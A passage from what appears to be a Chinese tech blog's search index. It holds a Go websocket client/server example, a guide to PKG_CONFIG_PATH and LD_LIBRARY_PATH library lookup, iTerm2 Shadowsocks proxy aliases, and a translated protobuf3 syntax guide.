err)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc main() {\n\tflag.Parse()\n\thttp.HandleFunc(\"/echo\", echo)\n\tlog.Fatal(http.ListenAndServe(*addr, nil))\n}\n```\n\n\n\n##### 2.2 client端\n\nclient启动后，首先连接server。连接建立后，主routine每一秒钟向server发送消息(当前时间)。另一个routine从server接收数据,并打印。\n\n当client退出时，会向server发送关闭消息。接着，等待退出。\n\n```go\npackage main\n\nimport (\n\t\"flag\"\n\t\"log\"\n\t\"net/url\"\n\t\"os\"\n\t\"os/signal\"\n\t\"time\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nvar addr = flag.String(\"addr\", \"localhost:8080\", \"http service address\")\n\nfunc main() {\n\tflag.Parse()\n\tlog.SetFlags(0)\n\n\tinterrupt := make(chan os.Signal, 1)\n\tsignal.Notify(interrupt, os.Interrupt)\n\n\tu := url.URL{Scheme: \"ws\", Host: *addr, Path: \"/echo\"}\n\tlog.Printf(\"connecting to %s\", u.String())\n\n\tc, _, err := websocket.DefaultDialer.Dial(u.String(), nil)\n\tif err != nil {\n\t\tlog.Fatal(\"dial:\", err)\n\t}\n\tdefer c.Close()\n\n\tdone := make(chan struct{})\n\n\tgo func() {\n\t\tdefer close(done)\n\t\tfor {\n\t\t\t_, message, err := c.ReadMessage()\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"read:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tlog.Printf(\"client recv: %s\", message)\n\t\t}\n\t}()\n\n\tticker := time.NewTicker(time.Second)\n\tdefer ticker.Stop()\n\n\tfor {\n\t\tselect {\n\t\tcase <-done:\n\t\t\treturn\n\t\tcase t := <-ticker.C:\n\t\t\terr := c.WriteMessage(websocket.TextMessage, []byte(t.String()))\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"write:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\tcase <-interrupt:\n\t\t\tlog.Println(\"interrupt\")\n\n\t\t\t// Cleanly close the connection by sending a close message and then\n\t\t\t// waiting (with timeout) for the server to close the connection.\n\t\t\terr := c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, \"\"))\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"write close:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tselect {\n\t\t\tcase <-done:\n\t\t\tcase <-time.After(time.Second):\n\t\t\t}\n\t\t\treturn\n\t\t}\n\t}\n}\n```\n\n\n\n![1](golang的websocket实战/1.png)\n\n\n\n### 3. 总结\n\n##### 服务器:\n\n+ var upgrader = websocket.Upgrader{}\n+ c, err := upgrader.Upgrade(w, r, nil)\n+ for循环里 c.ReadMessage()  和 c.WriteMessage(mt, message)\n\n##### 客户端:\n\n+ c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)\n+ for循环里 c.ReadMessage()  和 c.WriteMessage(mt, message)\n\n\n\n### 4. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/35167916\n+ https://www.jianshu.com/p/3fc3646fad80","tags":["websocket"],"categories":["4_golang实战"]},{"title":"动态库查找路径及LD_LIBRARY_PATH问题","url":"%2Fp%2F17c0913d.html","content":"\n说到和动态库查找路径相关的问题，总体上可以分为两类：\n\n+ 第一类：通过源代码编译程序时出现的找不到某个依赖包的问题\n+ 第二类：就是在运行程序的时候，明明把那个程序需要的依赖包都已经安装的妥妥的了，可运行的时候人家就告诉你说`error while loading shared libraries: libxxx.so.y: cannot open shared object file: No such file or directory`。\n\n<!-- more -->\n\n###    1. 源代码安装程序找不到依赖库\n\n通过源码包安装程序时，主要用到了“三大步”策略：configure、make和make install 。出问题最多的就是在configure阶段，很多初学者由于不知道configure的那么多参数该怎么用，所以往往为了省事，一句简单的“./configure”下去，百分之八九十都能成功，可问题往往就出在剩下的百分之十几上面了。\n\n\n\n在安装的configure阶段，为了检测安装安装环境是否满足，通常情况下都是通过一个叫做`pkg-config`的工具来检测它需要依赖的动态库是否存在，这个工具我们在上一篇博文已经认识过了。pkg-config通常情况都是位于/usr/bin目录下，是个可执行程序。在configure阶段，通常都会用pkg-config来判断所依赖的动态库是否存在。现在问题就是，这个工具是如何判断的呢？它的依据是什么？当这两个问题弄明白了，真相也就大白了。\n\n\n\n 一般当我们安装完某个程序后，如果它提供了动态库的功能，在源码中都会有一个或多个以pc结尾的文件，当执行完make install后这些pc文件拷贝到${prefix}/lib/pkgconfig这个目录里，这里的prefix就是我们在configure阶段时通过配置参数--prefix指定的，缺省情况这个值就是/usr/local，所以这些pc文件最终会被拷贝到/usr/local/lib/pkgconfig目录下。可能有人会问，这些pc文件有啥用呢？我们随便打开一个来瞅瞅：\n\n```shell\n\n[root@localhost ~]# cat /usr/local/lib/pkgconfig/librtmp.pc\nprefix=/usr/local\nexec_prefix=${prefix}\nlibdir=${exec_prefix}/lib\nincdir=${prefix}/include\n\n\nName: librtmp\nDescription: RTMP implementation\nVersion: v2.3\nRequires: libssl,libcrypto\nURL: http://rtmpdump.mplayerhq.hu\nLibs: -L${libdir} -lrtmp -lz\nCflags: -I${incdir}\n```\n\n跟我们configure阶段相关的主要集中在Libs和Cflags两项上面，如果你此时再执行下面这两条命令，就全明白了：\n\n```shell\n[root@localhost ~]# pkg-config --cflags librtmp\n-I/usr/local/include\n[root@localhost ~]# pkg-config --libs librtmp\n-L/usr/local/lib -lrtmp -lz -lssl -lcrypto\n```\n\n也就是说，pkg-config把我们以前需要在Makefile里指定编译和链接时所需要用到的参数从手工硬编码的模式变成了自动完成，节约了多少跨平台移植的兼容性问题。\n\n\n\n##### 1.1 安装了找不到依赖库的原因\n\n假如说，如果我们将要的编译的软件包依赖librtmp这个动态库，那么此时在我系统上这个检测就算通过了。当然这只是第一步，检测过了不一定兼容，这里我们只讨论能不能找到依赖库的问题。好了，如果说找不到某个库该怎么办。前提是你确确实实已经安装了它需要的库，不用多想，原因只有一个，pkg-config找不到这个与这个库对应的pc文件。\n\n为什么会找不到呢，原因又有两点：\n\n1、pkg-config搜索了所有它认为合适的目录都没找着这个库对应的pc文件的下落；\n\n2、这个库在发布时根本就没有提供它的pc文件。\n\n> 那么pkg-config的查找路径是哪里？\n\npkg-config较老的版本里，缺省情况下会到/usr/lib/pkgconfig、/usr/loca/lib/pkgconfig、/usr/share/pkgconfig等目录下去搜索pc文件，据我所知在0.23以及之后的版本里pkg-config的源码里已经没有关于缺省搜索路径的任何硬编码的成分了，取而代之的是，当你看pkg-config的man手册时会有下面一段话：\n\n```\npkg-config retrieves information about packages from special metadata files. These files are  named  after the  package,  with  the extension .pc.\nBy default, pkg-config looks in the directory ___prefix___/lib/pkgconfig for these files; it will also look in the colon-separated (on Windows, semicolon-separated) list of directories specified by the PKG_CONFIG_PATH environment variable.\n\n\n\nPKG_CONFIG_PATH\n    A colon-separated (on Windows, semicolon-separated) list of directories to search  for  .pc  files. The  default directory will always be searched after searching the path; the default is ___libdir___/pkg-config:___datadir___/pkgconfig where libdir is the libdir where pkg-config and  datadir  is  the  datadir where pkg-config was installed.\n```\n\n\n\n  上面的prefix、libdir和datadir，就是安装pkg-config时被设定好的，具体情况是：\n\n+ 如果你是通过yum和rpm包安装的\n\n  ```bash\n  prefix=/usr\n  libdir=${prefix}/lib=/usr/lib\n  datadir=${prefix}/share=/usr/share\n  ```\n\n+ 如果你是通过源码包安装的，且没有指定prefix的值\n\n  ```bash\n  prefix=/usr/local\n  libdir=${prefix}/lib=/usr/local/lib\n  datadir=${prefix}/share=/usr/local/share \n  ```\n\n\n\npkg-config在查找对应软件包的信息时的缺省搜索路径已经很清楚了，就是是`${libdir}/pkgconfig`和`${datadir}/pkgconfig`。如果你软件包对应的pc文件都不在这两个目录下时，pkg-config肯定找不到。既然原因都已经找到了，那解决办法也就多种多样了。\n\n\n\n##### 1.2 解决找不到库的问题(PKG_CONFIG_PATH)\n\n+ 我们可以在安装我们那个被依赖的软件包时，在configure阶段用--prefix参数把安装目录指定到/usr目录下；\n\n+ 也可以按照上面说的，通过一个名叫`PKG_CONFIG_PATH`的环境变量来向pkg-config指明我们自己的pc文件所在的路径，不过要注意的是`PKG_CONFIG_PATH`所指定的路径优先级比较高，pkg-config会先进行搜索，完了之后才是去搜索缺省路径。\n\n前者的优点是以后再通过源码安装软件时少了不少麻烦，缺点是用户自己的软件包和系统软件混到一起不方便管理，所以实际使用中，后者用的要多一些。如下:\n\n```bash\nexport PKG_CONFIG_PATH=/your/local/path:$PKG_CONFIG_PATH\n```\n\n  然后，在configure时就绝对没问题了。\n\n\n\n### 2. 程序运行时出现libxxx.so.y => not found\n\n##### 2.1 ldd 查看依赖的动态库\n\n用`ldd 可执行程序名`可以查看一个软件启动时所依赖的动态库，如果输出项有“libxxx.so.y=> not found”一项，你这个软件100%运行不起来。我们来做个试验：\n\n```bash\n[root@localhost ~]# echo $LD_LIBRARY_PATH    //嘛也没有\n[root@localhost ~]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => /usr/local/lib/libmp3lame.so.0 (0x0088c000)\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x00573000)\n........\n```\n\n\n\n我的系统里没有设置`LD_LIBRARY_PATH`环境变量，现在我们把其中的一个库`libmp3lame.so.0`从`/usr/loca/lib`下移动到/opt目录里，并执行ldconfig，让`libmp3lame.so.0`彻底从`/etc/ld.so.cache`里面消失。其实`libmp3lame.so.0`只是`libmp3lame.so.0.0.0`的一个符号链接，我们真正需要移动的是后者.\n\n完了之后再执行ldd /usr/local/bin/ffmpeg时结果如下：\n\n```bash\n[root@localhost ~]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => not found    //果然Not found 了\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x004a4000)\n........\n\n[root@localhost ~]# ffmpeg --help\nffmpeg: error while loading shared libraries: libmp3lame.so.0: cannot open shared object file: No such file or directory  //此时ffmpeg当然运行不起来\n```\n\n   \n\n##### 2.2 LD_LIBRARY_PATH \n\n我们来试试LD_LIBRARY_PATH，看看好使不：\n\n```bash\n[root@localhost opt]# export LD_LIBRARY_PATH=/opt:$LD_LIBRARY_PATH\n[root@localhost opt]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => not found           //纳尼？？！！！\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x00124000)\n........\n```\n\n还记得上面提到了软链接么，`libmp3lame.so.0`就是`libmp3lame.so.0.0.0`的软链接，这是动态库的命名规范的一种公约，我们只要在/opt/目录下建立一个名为`libmp3lame.so.0`的到`/opt/libmp3lame.so.0.0.0`的软链接就OK了：\n\n```bash\n[root@localhost opt]# ln -s libmp3lame.so.0.0.0 libmp3lame.so.0\n[root@localhost opt]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => /opt/libmp3lame.so.0 (0x00767000)   //终于圆满了:)\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x006e8000)\n........\n```\n\n### 3. 总结\n\n针对动态库路径查找的种种问题，无非就这么两大类，关键是找对原因，对症下药，方能药到病除。\n\n+ PKG_CONFIG_PATH从字面意思上翻译，就是“软件包的配置路径”，这不很明显了么，编译软件时如果出现找不到所依赖的动态库时都全靠PKG_CONFIG_PATH了；\n+ LD_LIBRARY_PATH也很直白了“装载器的库路径”，LD是Loader的简写，在Linux系统启动一个程序的过程就叫做装载，一个程序要执行时它或多或少的会依赖一些动态库(静态编译的除外)。\n\n### 4. 参考资料\n\n+ http://blog.chinaunix.net/uid-23069658-id-4028681.html\n+ https://prefetch.net/articles/linkers.badldlibrary.html","tags":["linux"],"categories":["系统"]},{"title":"为iterm2设置shadowsocks代理","url":"%2Fp%2F937317d6.html","content":"\nshadowsocks是我们常用的代理工具，它使用socks5协议，而终端很多工具目前只支持http和https等协议，对socks5协议支持不够好，所以我们为终端设置shadowsocks的思路就是将socks协议转换成http协议，然后为终端设置即可。\n\n\n\n# 1. 设置终端代理\n\n最新的 [ShadowsocksX-NG](https://github.com/shadowsocks/ShadowsocksX-NG/releases/) 已经支持终端代理, 我们可以如下图复制得出:\n```bash\nexport http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;\n```\n<!-- more -->\n\n<img src=\"为iterm2设置shadowsocks代理/1.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n为了方便, 我们可以制作一下别名\n\n```bash\nalias setproxy='export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;' # 设置终端代理\n\nalias disproxy='unset http_proxy https_proxy' # 取消终端代理\n\nalias ip='curl cip.cc' # 测试\n```\n\n另外我们可以通过`ShadowsocksX-NG` 的偏好设置看到以下相关配置.\n\n\n\n### 1.1 http监听端口\n\n<img src=\"为iterm2设置shadowsocks代理/2.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n### 1.2 sockes5监听端口\n\n<img src=\"为iterm2设置shadowsocks代理/3.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n# 2. 参考资料\n\n+ https://droidyue.com/blog/2016/04/04/set-shadowsocks-proxy-for-terminal/\n+ https://blog.naaln.com/2019/03/terminal-proxy/\n","tags":["iterm2"],"categories":["终端"]},{"title":"protobuf3语法指南02","url":"%2Fp%2F2f7b392a.html","content":"\n### 7. 更新消息类型\n\n如果现有的消息类型不再满足您的所有需求 - 例如，您希望消息格式具有额外的字段 - 但您仍然希望使用使用旧格式创建的代码，请不要担心！在不破坏任何现有代码的情况下更新消息类型非常简单。请记住以下规则：\n\n<!-- more -->\n\n- 请勿更改任何现有字段的字段编号。\n- 如果添加新字段，则使用“旧”消息格式按代码序列化的任何消息仍可由新生成的代码进行解析。您应该记住这些元素的[默认值](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)，以便新代码可以正确地与旧代码生成的消息进行交互。同样，您的新代码创建的消息可以由旧代码解析：旧的二进制文件在解析时只是忽略新字段。有关详细信息，请参阅“ [未知字段”](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23unknowns)部分\n- 只要在更新的消息类型中不再使用字段编号，就可以删除字段。您可能希望重命名该字段，可能添加前缀“OBSOLETE_”，或者[保留](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23reserved)字段编号，以便您的未来用户`.proto`不会意外地重复使用该编号。\n- `int32`，`uint32`，`int64`，`uint64`，和`bool`都是兼容的-这意味着你可以改变这些类型到另一个的一个场不破坏forwards-或向后兼容。如果从导线中解析出一个不符合相应类型的数字，您将获得与在C ++中将该数字转换为该类型相同的效果（例如，如果将64位数字作为int32读取，它将被截断为32位）。\n- `sint32`并且`sint64`彼此兼容但与其他整数类型*不*兼容。\n- `string``bytes`只要字节是有效的UTF-8 ，它们是兼容的。\n- `bytes`如果字节包含消息的编码版本，则嵌入消息是兼容的。\n- `fixed32`与兼容`sfixed32`，并`fixed64`用`sfixed64`。\n- `enum`与兼容`int32`，`uint32`，`int64`，和`uint64`电线格式条款（注意，如果他们不适合的值将被截断）。但请注意，在反序列化消息时，客户端代码可能会以不同方式对待它们：例如，`enum`将在消息中保留未识别的proto3 类型，但在反序列化消息时如何表示这种类型取决于语言。Int字段总是保留它们的价值。\n- 将单个值更改为**新** 成员`oneof`是安全且二进制兼容的。`oneof`如果您确定没有代码一次设置多个字段，则将多个字段移动到新字段可能是安全的。将任何字段移动到现有字段`oneof`并不安全。\n\n\n\n### 8. 未知字段\n\n未知字段是格式良好的协议缓冲区序列化数据，表示解析器无法识别的字段。例如，当旧二进制文件解析具有新字段的新二进制文件发送的数据时，这些新字段将成为旧二进制文件中的未知字段。\n\n最初，proto3消息在解析期间总是丢弃未知字段，但在3.5版本中，我们重新引入了保存未知字段以匹配proto2行为。在版本3.5及更高版本中，未知字段在解析期间保留并包含在序列化输出中。\n\n\n\n### 9. 任何\n\n该`Any`消息类型，可以使用邮件作为嵌入式类型，而不必自己.proto定义。一个`Any`含有任意的序列化消息`bytes`，以充当一个全局唯一标识符和解析到该消息的类型的URL一起。要使用该`Any`类型，您需要[导入](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23other)`google/protobuf/any.proto`。\n\n```protobuf\nimport \"google/protobuf/any.proto\";\n\nmessage ErrorStatus {\n  string message = 1;\n  repeated google.protobuf.Any details = 2;\n}\n```\n\n给定消息类型的默认类型URL是。 `type.googleapis.com/*packagename*.*messagename*`\n\n不同的语言实现将支持运行时库佣工类型安全的方式打包和解包的任何值-例如，在Java中，任何类型都会有特殊`pack()`和`unpack()`存取，而在C ++中有`PackFrom()`和`UnpackTo()`方法：\n\n```protobuf\n// Storing an arbitrary message type in Any.\nNetworkErrorDetails details = ...;\nErrorStatus status;\nstatus.add_details()->PackFrom(details);\n\n// Reading an arbitrary message from Any.\nErrorStatus status = ...;\nfor (const Any& detail : status.details()) {\n  if (detail.Is<NetworkErrorDetails>()) {\n    NetworkErrorDetails network_error;\n    detail.UnpackTo(&network_error);\n    ... processing network_error ...\n  }\n}\n```\n\n**目前，正在开发用于处理Any类型的运行时库**。\n\n如果您已熟悉[proto2语法](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)，则Any类型将替换[扩展](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto%23extensions)。\n\n\n\n### 10. Oneof\n\n如果您有一个包含许多字段的消息，并且最多只能同时设置一个字段，则可以使用oneof功能强制执行此行为并节省内存。\n\n除了一个共享内存中的所有字段之外，其中一个字段类似于常规字段，并且最多可以同时设置一个字段。设置oneof的任何成员会自动清除所有其他成员。您可以使用特殊`case()`或`WhichOneof()`方法检查oneof中的哪个值（如果有），具体取决于您选择的语言。\n\n##### 10.1 使用Oneof\n\n要在您中定义oneof，请`.proto`使用`oneof`关键字后跟您的oneof名称，在这种情况下`test_oneof`：\n\n```protobuf\nmessage SampleMessage {\n  oneof test_oneof {\n    string name = 4;\n    SubMessage sub_message = 9;\n  }\n}\n```\n\n然后，将oneof字段添加到oneof定义中。您可以添加任何类型的字段，但不能使用`repeated`字段。\n\n在生成的代码中，oneof字段与常规字段具有相同的getter和setter。您还可以使用特殊方法检查oneof中的值（如果有）。您可以在相关[API参考中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)找到有关所选语言的oneof API的更多信息。\n\n##### 10.2 Oneof 特性\n\n- 设置oneof字段将自动清除oneof的所有其他成员。因此，如果您设置了多个字段，则只有您设置的最后一个字段仍然具有值。\n\n  ```protobuf\n  SampleMessage message;\n  message.set_name(\"name\");\n  CHECK(message.has_name());\n  message.mutable_sub_message();   // Will clear name field.\n  CHECK(!message.has_name());\n  ```\n  \n- 如果解析器在线路上遇到同一个oneof的多个成员，则在解析的消息中仅使用看到的最后一个成员。\n\n- oneof不支持`repeated`。\n\n- Reflection API适用于其中一个字段。\n\n- 如果您使用的是C ++，请确保您的代码不会导致内存崩溃。以下示例代码将崩溃，`sub_message`已通过调用该`set_name()`方法删除了该代码。\n\n  ```protobuf\n  SampleMessage message;\n  SubMessage* sub_message = message.mutable_sub_message();\n  message.set_name(\"name\");      // Will delete sub_message\n  sub_message->set_...            // Crashes here \n  ```\n  \n- 同样在C ++中，如果你有`Swap()`两个消息与oneofs，每个消息最终将与另一个消息结果：在下面的例子中，`msg1`将有一个`sub_message`，`msg2`并将有一`name`。\n\n  ```protobuf\n  SampleMessage msg1;\n  msg1.set_name(\"name\");\n  SampleMessage msg2;\n  msg2.mutable_sub_message();\n  msg1.swap(&msg2);\n  CHECK(msg1.has_sub_message());\n  CHECK(msg2.has_name());\n  ```\n\n##### 10.3 向后兼容性问题\n\n添加或删除其中一个字段时要小心。如果检查oneof返回的值`None`/ `NOT_SET`，这可能意味着oneof尚未设置或已在不同版本的oneof的被设置为一个字段。没有办法区分，因为没有办法知道线上的未知字段是否是其中一个成员。\n\n##### 10.4 标签重用问题\n\n- **将字段移入或移出oneof**：在序列化和解析消息后，您可能会丢失一些信息（某些字段将被清除）。但是，您可以安全地将单个字段移动到**新的** oneof中，并且如果已知只有一个字段被设置，则可以移动多个字段。\n- **删除oneof字段并将其添加回**：在序列化和解析消息后，这可能会清除当前设置的oneof字段。\n- **拆分或合并oneof**：这与移动常规字段有类似的问题。\n\n### 11. 地图\n\n如果要在数据定义中创建关联映射，协议缓冲区提供了一种方便的快捷方式语法：\n\n```protobuf\nmap < key_type ，value_type > map_field = N ;\n```\n\n...其中`key_type`可以是任何整数或字符串类型（因此，除了浮点类型之外的任何[标量](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23scalar)类型`bytes`）。请注意，枚举不是有效的`key_type`。的`value_type`可以是任何类型的除另一地图。\n\n因此，例如，如果要创建项目映射，其中每条`Project`消息都与字符串键相关联，则可以像下面这样定义它：\n\n```protobuf\nmap < string ，Project > projects = 3 ;  \n```\n\n- 地图字段不能`repeated`。\n- 地图值的有线格式排序和地图迭代排序未定义，因此您不能依赖于特定顺序的地图项目。\n- 为a生成文本格式时`.proto`，地图按键排序。数字键按数字排序。\n- 从线路解析或合并时，如果有重复的映射键，则使用最后看到的键。从文本格式解析映射时，如果存在重复键，则解析可能会失败。\n- 如果为映射字段提供键但没有值，则字段序列化时的行为取决于语言。在C ++，Java和Python中，类型的默认值是序列化的，而在其他语言中没有任何序列化。\n\n生成的地图API目前可用于所有proto3支持的语言。您可以在相关[API参考中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)找到有关所选语言的地图API的更多信息。\n\n##### 11.1 向后兼容性\n\n映射语法在线上等效于以下内容，因此不支持映射的协议缓冲区实现仍可处理您的数据：\n\n```\nmessage MapFieldEntry {\n  key_type key = 1;\n  value_type value = 2;\n}\n\nrepeated MapFieldEntry map_field = N;\n```\n\n任何支持映射的协议缓冲区实现都必须生成和接受上述定义可以接受的数据。\n\n\n\n### 12. 包\n\n您可以向`.proto`文件添加`package`可选说明符，以防止协议消息类型之间的名称冲突。\n\n```protobuf\npackage foo.bar;\nmessage Open { ... }\n```\n\n然后，您可以在定义消息类型的字段时使用包说明符：\n\n```protobuf\nmessage Foo {\n  ...\n  foo.bar.Open open = 1;\n  ...\n}\n```\n\n包说明符影响生成的代码的方式取决于您选择的语言：\n\n- 在**C ++中**，生成的类包含在C ++命名空间中。例如，`Open`将在命名空间中`foo::bar`。\n- 在**Java中**，该包用作Java包，除非您`option java_package`在`.proto`文件中明确提供了该包。\n- 在**Python中**，package指令被忽略，因为Python模块是根据它们在文件系统中的位置进行组织的。\n- 在**Go中**，该包用作Go包名称，除非您`option go_package`在`.proto`文件中明确提供。\n- 在**Ruby中**，生成的类包含在嵌套的Ruby命名空间内，转换为所需的Ruby大写形式（首字母大写;如果第一个字符不是字母，`PB_`则前置）。例如，`Open`将在命名空间中`Foo::Bar`。\n- 在**C＃中**，包转换为PascalCase后用作命名空间，除非您`option csharp_namespace`在`.proto`文件中明确提供。例如，`Open`将在命名空间中`Foo.Bar`。\n\n##### 12.1 包和名称解析\n\n协议缓冲区语言中的类型名称解析与C ++类似：首先搜索最里面的范围，然后搜索下一个范围，依此类推，每个包被认为是其父包的“内部”。一个领先的'。' （例如，`.foo.bar.Baz`）意味着从最外层的范围开始。\n\nprotobuf 编译器通过解析导入的`.proto`文件来解析所有类型名称。每种语言的代码生成器都知道如何使用该语言引用每种类型，即使它具有不同的范围规则。\n\n\n\n### 13. 定义服务\n\n如果要将消息类型与RPC（远程过程调用）系统一起使用，则可以在`.proto`文件中定义RPC服务接口，protobuf 编译器将使用您选择的语言生成服务接口代码和存根。因此，例如，如果要定义RPC服务请求方法为:`SearchRequest`和返回方法为:`SearchResponse`，可以`.proto`按如下方式在文件中定义它：\n\n```protobuf\nservice SearchService {\n  rpc Search（SearchRequest）returns（SearchResponse）;\n}\n```\n\n与协议缓冲区一起使用的最简单的RPC系统是[gRPC](https://link.juejin.im?target=https%3A%2F%2Fgrpc.io%2F)：一种由Google开发的，平台中立的开源RPC系统。gRPC特别适用于protobuf，并允许在您的`.proto`文件中使用特殊的protobuf 编译器插件直接生成相关的RPC代码。\n\n如果您不想使用gRPC，也可以将protobuf与您自己的RPC实现一起使用。您可以在[Proto2语言指南中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto%23services)找到更多相关信息。\n\n还有一些正在进行的第三方项目使用Protocol Buffers开发RPC实现。有关我们了解的项目的链接列表，请参阅[第三方加载项wiki页面](https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fgoogle%2Fprotobuf%2Fblob%2Fmaster%2Fdocs%2Fthird_party.md)。\n\n\n\n### 14. JSON映射\n\nProto3支持JSON中的规范编码，使得在系统之间共享数据变得更加容易。在下表中逐个类型地描述编码。\n\n如果JSON编码数据中缺少值`null`，或者其值为，则在解析为协议缓冲区时，它将被解释为适当的[默认值](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)。如果字段在协议缓冲区中具有默认值，则默认情况下将在JSON编码数据中省略该字段以节省空间。实现可以提供用于在JSON编码的输出中发出具有默认值的字段的选项。\n\n| proto3                 | JSON          | JSON示例                                 | 笔记                                                         |\n| ---------------------- | ------------- | ---------------------------------------- | ------------------------------------------------------------ |\n| message                | object        | `{\"fooBar\": v, \"g\": null,…}`             | 生成JSON对象。消息字段名称映射到小写驼峰并成为JSON对象键。如果`json_name`指定了field选项，则指定的值将用作键。解析器接受小写驼峰名称（或`json_name`选项指定的名称）和原始proto字段名称。`null`是所有字段类型的可接受值，并将其视为相应字段类型的默认值。 |\n| eunm                   | String        | `\"FOO_BAR\"`                              | 使用proto中指定的枚举值的名称。解析器接受枚举名称和整数值。  |\n| map<K，V>              | object        | `{\"k\": v, …}`                            | 所有键都转换为字符串。                                       |\n| repeated V.            | array         | `[v, …]`                                 | `null` 被接受为空列表[]。                                    |\n| bool                   | true,false    | `true, false`                            |                                                              |\n| string                 | string        | `\"Hello World!\"`                         |                                                              |\n| bytes                  | base64 string | `\"YWJjMTIzIT8kKiYoKSctPUB+\"`             | JSON值将是使用带填充的标准base64编码编码为字符串的数据。接受带有/不带填充的标准或URL安全base64编码。 |\n| int32，fixed32，uint32 | string        | `1, -10, 0`                              | JSON值将是十进制数。接受数字或字符串。                       |\n| int64，fixed64，uint64 | string        | `\"1\", \"-10\"`                             | JSON值将是十进制字符串。接受数字或字符串。                   |\n| float,double           | number        | `1.1, -10.0, 0, \"NaN\",\"Infinity\"`        | JSON值将是一个数字或一个特殊字符串值“NaN”，“Infinity”和“-Infinity”。接受数字或字符串。指数表示法也被接受。 |\n| any                    | object        | `{\"@type\": \"url\", \"f\": v, … }`           | 如果Any包含具有特殊JSON映射的值，则将按如下方式进行转换：。否则，该值将转换为JSON对象，并将插入该字段以指示实际的数据类型。`{\"@type\": xxx, \"value\": yyy}``\"@type\"` |\n| Timestamp              | string        | `\"1972-01-01T10:00:20.021Z\"`             | 使用RFC 3339，其中生成的输出将始终被Z标准化并使用0,3,6或9个小数位。也接受“Z”以外的偏移。 |\n| Duration               | string        | `\"1.000340012s\", \"1s\"`                   | 生成的输出始终包含0,3,6或9个小数位，具体取决于所需的精度，后跟后缀“s”。接受的是任何小数位（也没有），只要它们符合纳秒精度并且后缀“s”是必需的。 |\n| Struct                 | `object`      | `{ … }`                                  | 任何JSON对象。见。`struct.proto`                             |\n| Wrapper types          | various types | `2, \"2\", \"foo\", true,\"true\", null, 0, …` | 包装器在JSON中使用与包装基元类型相同的表示形式，除了`null`在数据转换和传输期间允许和保留的表示形式。 |\n| FieldMask              | string        | `\"f.fooBar,h\"`                           | 见。`field_mask.proto`                                       |\n| ListValue              | array         | `[foo, bar, …]`                          |                                                              |\n| Value                  | value         |                                          | 任何JSON值                                                   |\n| NullValue              | null          |                                          | JSON null                                                    |\n\n##### 13.1 JSON选项\n\nproto3  JSON实现可以提供以下选项：\n\n- **使用默认值发出字段**：默认情况下，proto3 JSON输出中省略了**具有默认值的**字段。实现可以提供覆盖此行为的选项，并使用其默认值输出字段。\n- **忽略未知字段**：默认情况下，Proto3 JSON解析器应拒绝未知字段，但可以提供忽略解析中未知字段的选项。\n- **使用proto字段名称而不是小写驼峰名称**：默认情况下，proto3 JSON打印机应将字段名称转换为小写驼峰并将其用作JSON名称。实现可以提供使用proto字段名称作为JSON名称的选项。Proto3 JSON解析器需要接受转换后的小写驼峰名称和proto字段名称。\n- **将枚举值发送为整数而不是字符串**：默认情况下，在JSON输出中使用枚举值的名称。可以提供选项以使用枚举值的数值。\n\n### 14. 选项\n\n`.proto`文件中的各个声明可以使用许多*选项*进行注释。选项不会更改声明的整体含义，但可能会影响在特定上下文中处理它的方式。可用选项的完整列表在中定义`google/protobuf/descriptor.proto`。\n\n一些选项是文件级选项，这意味着它们应该在顶级范围内编写，而不是在任何消息，枚举或服务定义中。一些选项是消息级选项，这意味着它们应该写在消息定义中。一些选项是字段级选项，这意味着它们应该写在字段定义中。选项也可以写在枚举类型，枚举值，服务类型和服务方法上; 但是，目前没有任何有用的选择。\n\n以下是一些最常用的选项：\n\n- `java_package`（文件选项）：用于生成的Java类的包。如果`.proto`文件中没有给出显式选项`java_package`，则默认情况下将使用proto包（使用文件中的“package”关键字指定  .proto  